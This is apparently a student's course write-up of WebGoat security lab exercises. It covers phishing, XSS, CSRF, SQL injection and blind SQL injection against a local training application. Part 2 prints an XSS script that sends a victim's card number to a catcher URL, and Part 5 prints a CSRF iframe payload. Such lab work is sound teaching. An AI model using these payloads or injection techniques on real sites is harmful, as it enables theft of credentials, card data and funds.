# Haoran Yin, 1005773432, haoran.yin@mail.utoronto.ca
# Chengyi Zhou, 1006212821, chengyi.zhou@mail.utoronto.ca

Part 1 Explanation:
In this part we create a fake webpage that tricks the user to enter their username and password.
Once we obtain those info through the HTML form, we send it to the cather servlet

Part 2 Explanation:
We insert the executable script in the access code text box by assigning specific values through url,
which reads the user input (card number) from input1 text box and sends it to the catcher servlet once the submit button is clicked.
We also add extra spaces at the front of script part to hide it
http://localhost:8090/WebGoat/start.mvc#attack/297061215/900?input1=4128 3214 0002 1999&input2=000
<script>
    part2 = function() {
        XssImage = new Image;
        XssImage.src="http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCardNum="
        + new String(document.forms[0].input1.value);
    }
    document.form.buy.setAttribute('onclick', 'part2()')
</script>

Part 3 Explanation:
We insert a malicious image in the message part of the email, whose source is the url that starts a money transfer.
Once the receiver click on the message, the transfer will begin

Part 4 Explanation:
We insert two malicious iframes in the message part of the email; the first frame contains the similar source url as in part3
that starts a transfer but also sets the url of the second frame. The source url of the second frame confirms the transfer
starts by the first frame. Once the user click on the email, money transfer and confirmation will happen

Part 5 Explanation:
<iframe id="iframe" src="http://localhost:8090/WebGoat/attack?Screen=605842438&menu=900&transfer=main" width="500" height="500"></iframe>
We first use the message content above to view the frame page returned by the server. We observe that on the returned page there is
a webpage form which allows the user to enter the amount of money to transfer and appends a token to that value during submission.
Therefore, similar to part4 but this time we add a script that executes when the first frame is load, which gets the token from
the webpage returned by the server

Part 6 Explanation:
Dealing with quote input, we can use a fake message input appended with ''' to trick the query and add a comparison which always evaluate true after the fake message, 
in this case, the query will execute and print out everything bypassing the fake message

Part 7 Explanation:
a colon is needed so that this exercise will work. The goal is to change the salary of one row starting with user_id = 101, use the update statement
setting up a backdoor follows similar procedure than the previous part of this exercise. Following the hints, we need to change the email address
to 'ece568_24s@utoronto.ca', so use the 'set" statement in the query. Everytime a new row is created with new user id, the email address will be updated

Part 8 Explanation:
for a protected table which only returns invalid or valid account number to everything thats passed in, we need to use logic operators to connect two parts of the query. 
the first part of the query is 101, which is known to be valid; the second part of the query will be our examination message, which select the pin from the credit table 
of cc_number row. While we are not able to know the direct answer of the pin, we can use the valid/invalid responce from the web and use a binary search (or any search algorithm)
muanlly to get the result (constantly changing the guessed value, just like doing a search)